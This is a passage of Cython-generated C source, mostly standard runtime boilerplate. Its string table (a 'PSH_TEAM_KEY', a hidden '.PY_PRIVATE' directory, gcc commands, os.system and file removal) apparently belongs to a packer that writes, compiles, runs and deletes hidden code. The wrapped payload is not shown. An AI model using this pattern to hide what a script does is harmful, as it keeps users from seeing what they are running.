args, nargs)\\\n    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)\n#if 1 || PY_VERSION_HEX < 0x030600B1\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);\n#else\n#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)\n#endif\n#define __Pyx_BUILD_ASSERT_EXPR(cond)\\\n    (sizeof(char [1 - 2*!(cond)]) - 1)\n#ifndef Py_MEMBER_SIZE\n#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)\n#endif\n#if CYTHON_FAST_PYCALL\n  static size_t __pyx_pyframe_localsplus_offset = 0;\n  #include \"frameobject.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\n  #define __Pxy_PyFrame_Initialize_Offsets()\\\n    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\\\n     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f""_localsplus)))\n  #define __Pyx_PyFrame_GetLocalsplus(frame)\\\n    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))\n#endif // CYTHON_FAST_PYCALL\n#endif\n\n/* PyObjectCall.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n/* PyObjectCallMethO.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);\n#endif\n\n/* PyObjectCallOneArg.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);\n\n/* GetItemInt.proto */\n#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\\\n    (is_list ? (PyErr_SetString(PyExc_IndexError, \"list index out of range\"), (PyObject*)NULL) :\\\n               __Pyx_GetItemInt_Generic(o, to_py_func(i))))\n#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, \"list index out of range\"), (PyObject*)NULL))\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\n#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\\\n    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\\\n    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\\\n    (PyErr_SetString(PyExc_IndexError, \"tuple index out of range\"), (PyObject*)NULL))""\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,\n                                                              int wraparound, int boundscheck);\nstatic PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);\nstatic CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,\n                                                     int is_list, int wraparound, int boundscheck);\n\n/* SliceObject.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(\n        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,\n        int has_cstart, int has_cstop, int wraparound);\n\n/* PyObjectLookupSpecial.proto */\n#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {\n    PyObject *res;\n    PyTypeObject *tp = Py_TYPE(obj);\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(PyInstance_Check(obj)))\n        return __Pyx_PyObject_GetAttrStr(obj, attr_name);\n#endif\n    res = _PyType_Lookup(tp, attr_name);\n    if (likely(res)) {\n        descrgetfunc f = Py_TYPE(res)->tp_descr_get;\n        if (!f) {\n            Py_INCREF(res);\n        } else {\n            res = f(res, obj, (PyObject *)tp);\n        }\n    } else {\n        PyErr_SetObject(PyExc_AttributeError, attr_name);\n    }\n    return res;\n}\n#else\n#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)\n#endif\n\n/* PyObjectCallNoArg.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);\n#else\n#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)\n#endif\n\n/* GetTopmostException.proto */\n#if CYTHON_USE_EXC_INFO_STACK\nstatic _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);\n#endif\n\n/* PyThreadStateGet.proto */\n#if CYTHON_FAST_THREAD_STATE\n#defin""e __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  PyErr_Occurred()\n#endif\n\n/* SaveResetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\n#else\n#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)\n#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)\n#endif\n\n/* GetException.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)\nstatic int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#else\nstatic int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);\n#endif\n\n/* PyErrFetchRestore.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *ts""tate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n/* CLineInTraceback.proto */\n#ifdef CYTHON_CLINE_IN_TRACEBACK\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#else\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#endif\n\n/* CodeObjectCache.proto */\ntypedef struct {\n    PyCodeObject* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n};\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\n\n/* AddTraceback.proto */\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n/* GCCDiagnostics.proto */\n#if defined(__GNUC__) && (__GNUC__ > 4"" || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n/* CIntToPy.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\n\n/* FastTypeChecks.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\n#endif\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n\n/* CheckBinaryVersion.proto */\nstatic int __Pyx_check_binary_version(void);\n\n/* InitStrings.proto */\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t);\n\n\n/* Module declarations from 'source' */\n#define __Pyx_MODULE_NAME \"source\"\nextern int __pyx_module_is_main_source;\nint __pyx_module_is_main_source = 0;\n\n/* Implementation of 'source' */\nstatic PyObject *__pyx_builtin_exit;\nstatic PyObject *__pyx_builtin_open;\nstatic const char __pyx_k_[] = \"\\330\\250\\330\\256 \\360\\237\\221\\200\";\nstatic const char __pyx_k_L[] = \" -L\";\nstatic const char __pyx_k_f[] = \"f\";\nstatic const char __pyx_k_o[] = \" -o \";\nstatic const char __pyx_k_w[] = \"w\";\nstatic const char __pyx_k__2[] = \"./\";\nstatic const char __pyx_k__3[] = \" && \";\nstatic const char __pyx_k__5[] = \".""\";\nstatic const char __pyx_k__6[] = \" \";\nstatic const char __pyx_k_os[] = \"os\";\nstatic const char __pyx_k_RUN[] = \"RUN\";\nstatic const char __pyx_k_sys[] = \"sys\";\nstatic const char __pyx_k_exit[] = \"exit\";\nstatic const char __pyx_k_main[] = \"__main__\";\nstatic const char __pyx_k_name[] = \"__name__\";\nstatic const char __pyx_k_open[] = \"open\";\nstatic const char __pyx_k_path[] = \"path\";\nstatic const char __pyx_k_test[] = \"__test__\";\nstatic const char __pyx_k_enter[] = \"__enter__\";\nstatic const char __pyx_k_gcc_I[] = \"gcc -I\";\nstatic const char __pyx_k_split[] = \"split\";\nstatic const char __pyx_k_write[] = \"write\";\nstatic const char __pyx_k_C_FILE[] = \"C_FILE\";\nstatic const char __pyx_k_PREFIX[] = \"PREFIX\";\nstatic const char __pyx_k_exit_2[] = \"__exit__\";\nstatic const char __pyx_k_import[] = \"__import__\";\nstatic const char __pyx_k_isfile[] = \"isfile\";\nstatic const char __pyx_k_prefix[] = \"prefix\";\nstatic const char __pyx_k_remove[] = \"remove\";\nstatic const char __pyx_k_system[] = \"system\";\nstatic const char __pyx_k_dirname[] = \"dirname\";\nstatic const char __pyx_k_version[] = \"version\";\nstatic const char __pyx_k_C_SOURCE[] = \"C_SOURCE\";\nstatic const char __pyx_k_exist_ok[] = \"exist_ok\";\nstatic const char __pyx_k_makedirs[] = \"makedirs\";\nstatic const char __pyx_k_executable[] = \"executable\";\nstatic const char __pyx_k_lib_lpython[] = \"/lib -lpython\";\nstatic const char __pyx_k_COMPILE_FILE[] = \"COMPILE_FILE\";\nstatic const char __pyx_k_EXECUTE_FILE[] = \"EXECUTE_FILE\";\nstatic const char __pyx_k_PSH_TEAM_KEY[] = \"PSH_TEAM_KEY\";\nstatic const char __pyx_k_py_private_c[] = \".py_private.c\";\nstatic const char __pyx_k_PYTHON_VERSION[] = \"PYTHON_VERSION\";\nstatic const char __pyx_k_include_python[] = \"/include/python\";\nstatic const char __pyx_k_EXPORT_PYTHONHOME[] = \"EXPORT_PYTHONHOME\";\nstatic const char __pyx_k_export_PYTHONHOME[] = \"export PYTHONHOME=\";\nstatic const char __""pyx_k_cline_in_traceback[] = \"cline_in_traceback\";\nstatic const char __pyx_k_EXPORT_PYTHON_EXECUTABLE[] = \"EXPORT_PYTHON_EXECUTABLE\";\nstatic const char __pyx_k_export_PYTHON_EXECUTABLE[] = \"export PYTHON_EXECUTABLE=\";\nstatic const char __pyx_k_PY_PRIVATE_20240909130901773[] = \".PY_PRIVATE/20240909130901773\";\nstatic const char __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define[] = \"#ifndef PY_SSIZE_T_CLEAN\\n#define PY_SSIZE_T_CLEAN\\n#endif /* PY_SSIZE_T_CLEAN */\\n#include \\\"Python.h\\\"\\n#ifndef Py_PYTHON_H\\n    #error Python headers needed to compile C extensions, please install development version of Python.\\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\\n    #error Cython requires Python 2.6+ or Python 3.3+.\\n#else\\n#define CYTHON_ABI \\\"0_29_33\\\"\\n#define CYTHON_HEX_VERSION 0x001D21F0\\n#define CYTHON_FUTURE_DIVISION 1\\n#include <stddef.h>\\n#ifndef offsetof\\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\\n#endif\\n#if !defined(WIN32) && !defined(MS_WINDOWS)\\n  #ifndef __stdcall\\n    #define __stdcall\\n  #endif\\n  #ifndef __cdecl\\n    #define __cdecl\\n  #endif\\n  #ifndef __fastcall\\n    #define __fastcall\\n  #endif\\n#endif\\n#ifndef DL_IMPORT\\n  #define DL_IMPORT(t) t\\n#endif\\n#ifndef DL_EXPORT\\n  #define DL_EXPORT(t) t\\n#endif\\n#define __PYX_COMMA ,\\n#ifndef HAVE_LONG_LONG\\n  #if PY_VERSION_HEX >= 0x02070000\\n    #define HAVE_LONG_LONG\\n  #endif\\n#endif\\n#ifndef PY_LONG_LONG\\n  #define PY_LONG_LONG LONG_LONG\\n#endif\\n#ifndef Py_HUGE_VAL\\n  #define Py_HUGE_VAL HUGE_VAL\\n#endif\\n#ifdef PYPY_VERSION\\n  #define CYTHON_COMPILING_IN_PYPY 1\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #undef CYTHON_USE_TYPE_SLOTS\\n  #define CYTHON_USE_TYPE_SLOTS 0\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #if PY_VERSION_HEX < 0x03050000\\n    #und""ef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #undef CYTHON_USE_UNICODE_INTERNALS\\n  #define CYTHON_USE_UNICODE_INTERNALS 0\\n  #undef CYTHON_USE_UNICODE_WRITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE\"\"_PYLONG_INTERNALS 0\\n  #undef CYTHON_AVOID_BORROWED_REFS\\n  #define CYTHON_AVOID_BORROWED_REFS 1\\n  #undef CYTHON_ASSUME_SAFE_MACROS\\n  #define CYTHON_ASSUME_SAFE_MACROS 0\\n  #undef CYTHON_UNPACK_METHODS\\n  #define CYTHON_UNPACK_METHODS 0\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\n  #undef CYTHON_USE_TP_FINALIZE\\n  #define CYTHON_USE_TP_FINALIZE 0\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\n  #endif\\n#elif defined(PYSTON_VERSION)\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 1\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #undef CYTHON_USE_ASYNC_SLOTS\\n  #define CYTHON_USE_ASYNC_SLOTS 0\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #undef CYTHON_USE_UNICODE_WRITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE_PYLONG""_INTERNALS 0\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0\\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\\n  #undef CYTHON\"\"_USE_TP_FINALIZE\\n  #define CYTHON_USE_TP_FINALIZE 0\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\\n  #endif\\n#elif defined(PY_NOGIL)\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 0\\n  #define CYTHON_COMPILING_IN_NOGIL 1\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYTYPE_LOOKUP\\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #ifndef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #undef CYTHON_USE_PYLIST_INTERNALS\\n  #define CYTHON_USE_PYLIST_INTERNALS 0\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #undef CYTHON_USE_UNICODE_WRITER\\n  #define CYTHON_USE_UNICODE_WRITER 0\\n  #undef CYTHON_USE_PYLONG_INTERNALS\\n  #define CYTHON_USE_PYLONG_INTERNALS 0\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #undef CYTHON_FAST_THREAD_STATE\\n  #define CYTHON_FAST_THREAD_STATE 0\\n  #undef CYTHON_FAST_PYCALL\\n  #define CYTHON_FAST_PYCALL 0""\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\\n  #endif\\n  #ifndef CYTHON_USE_TP_FINALIZE\\n    #define CYTHON_USE_TP_FINALIZE 1\\n  #endif\\n  #undef CYTHON_USE_DICT_VERSIONS\\n  #define CYTHON_USE_DICT_VERSIONS 0\\n  #undef CYTHON_USE_EXC_INFO_STACK\\n  #define CYTHON_USE_EXC_INFO_STACK 0\\n#else\\n  #define CYTHON_COMPILING_IN_PYPY 0\\n  #define CYTHON_COMPILING_IN_PYSTON 0\\n  #define CYTHON_COMPILING_IN_CPYTHON 1\\n  #define CYTHON_COMPILING_IN_NOGIL 0\\n  #ifndef CYTHON_USE_TYPE_SLOTS\\n    #define CYTHON_USE_TYPE_SLOTS 1\\n  #e\"\"ndif\\n  #if PY_VERSION_HEX < 0x02070000\\n    #undef CYTHON_USE_PYTYPE_LOOKUP\\n    #define CYTHON_USE_PYTYPE_LOOKUP 0\\n  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)\\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\\n  #endif\\n  #if PY_MAJOR_VERSION < 3\\n    #undef CYTHON_USE_ASYNC_SLOTS\\n    #define CYTHON_USE_ASYNC_SLOTS 0\\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\\n    #define CYTHON_USE_ASYNC_SLOTS 1\\n  #endif\\n  #if PY_VERSION_HEX < 0x02070000\\n    #undef CYTHON_USE_PYLONG_INTERNALS\\n    #define CYTHON_USE_PYLONG_INTERNALS 0\\n  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)\\n    #define CYTHON_USE_PYLONG_INTERNALS 1\\n  #endif\\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\\n    #define CYTHON_USE_PYLIST_INTERNALS 1\\n  #endif\\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\\n    #define CYTHON_USE_UNICODE_INTERNALS 1\\n  #endif\\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\\n    #undef CYTHON_USE_UNICODE_WRITER\\n    #define CYTHON_USE_UNICODE_WRITER 0\\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\\n    #define CYTHON_USE_UNICODE_WRITER 1\\n  #endif\\n  #ifndef CYTHON_AVOID_BORROWED_REFS\\n    #define CYTHON_AVOID_BORROWED_REFS 0\\n  #endif\\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\\n    #define CYTHON_ASSUME_SAFE_MACROS 1\\n  #endif\\n  #ifndef CYTHON_UNPACK_METHODS\\n    #define CYTHON_UNPACK_METHODS 1\\n  #endif\\n  #if PY_VERSION_HEX >= 0x030B00A4\\n    #undef CYTHON_FAST_TH""READ_STATE\\n    #define CYTHON_FAST_THREAD_STATE 0\\n  #elif !defined(CYTHON_FAST_THREAD_STATE)\\n    #define CYTHON_FAST_THREAD_STATE 1\\n  #endif\\n  #ifndef CYTHON_FAST_PYCALL\\n    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)\\n  #endif\\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\\n    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)\\n  #endif\\n  #ifndef CYTHON_USE_TP_FINALIZE\\n    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)\\n  #endif\\n  #ifndef CYTHON_USE_DICT_VERSIONS\\n    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)\\n  #endif\\n  #if PY_VERSION_HEX >= 0x030B0\"\"0A4\\n    #undef CYTHON_USE_EXC_INFO_STACK\\n    #define CYTHON_USE_EXC_INFO_STACK 0\\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\\n    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)\\n  #endif\\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\\n  #endif\\n#endif\\n#if !defined(CYTHON_FAST_PYCCALL)\\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\\n#endif\\n#if CYTHON_USE_PYLONG_INTERNALS\\n  #if PY_MAJOR_VERSION < 3\\n    #include \\\"longintrepr.h\\\"\\n  #endif\\n  #undef SHIFT\\n  #undef BASE\\n  #undef MASK\\n  #ifdef SIZEOF_VOID_P\\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\\n  #endif\\n#endif\\n#ifndef __has_attribute\\n  #define __has_attribute(x) 0\\n#endif\\n#ifndef __has_cpp_attribute\\n  #define __has_cpp_attribute(x) 0\\n#endif\\n#ifndef CYTHON_RESTRICT\\n  #if defined(__GNUC__)\\n    #define CYTHON_RESTRICT __restrict__\\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\\n    #define CYTHON_RESTRICT __restrict\\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\n    #define CYTHON_RESTRICT restrict\\n  #else\\n    #define CYTHON_RESTRICT\\n  #endif\\n#endif\\n#ifndef CYTHON_UNUSED\\n# if defined(__GNUC__)\\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ =="" 3 && __GNUC_MINOR__ >= 4))\\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\\n#   else\\n#     define CYTHON_UNUSED\\n#   endif\\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\\n# else\\n#   define CYTHON_UNUSED\\n# endif\\n#endif\\n#ifndef CYTHON_MAYBE_UNUSED_VAR\\n#  if defined(__cplusplus)\\n     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }\\n#  else\\n#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)\\n#  endif\\n#endif\\n#ifndef CYTHON_NCP_UNUSED\\n# if CYTHON_COMPILING_IN_CPYTHON\\n#  define CYTHON_NCP_UNUSED\\n# else\\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\\n# endif\\n#endif\\n#define __Pyx_void\"\"_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\\n#ifdef _MSC_VER\\n    #ifndef _MSC_STDINT_H_\\n        #if _MSC_VER < 1300\\n           typedef unsigned char     uint8_t;\\n           typedef unsigned int      uint32_t;\\n        #else\\n           typedef unsigned __int8   uint8_t;\\n           typedef unsigned __int32  uint32_t;\\n        #endif\\n    #endif\\n#else\\n   #include <stdint.h>\\n#endif\\n#ifndef CYTHON_FALLTHROUGH\\n  #if defined(__cplusplus) && __cplusplus >= 201103L\\n    #if 